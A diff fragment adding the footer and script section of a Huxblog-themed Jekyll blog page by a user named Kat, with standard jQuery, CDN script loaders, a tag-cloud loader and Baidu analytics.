+                    //跳转到指定锚点
+                    // document.getElementById(a.target.innerText.toLowerCase()).scrollIntoView(true);
+                    document.getElementById($(a.currentTarget).attr("href").replace("#","")).scrollIntoView({behavior: 'smooth' });
+                // }
+        })  
+</script>
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/Katsec">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kat 2022 
+                    <br>
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://www.spanning-tree.xyz">Kat</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://spanning-tree.xyz/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = 'c3741abb2552c30afc11553990fa44bd';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="https://spanning-tree.xyz/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
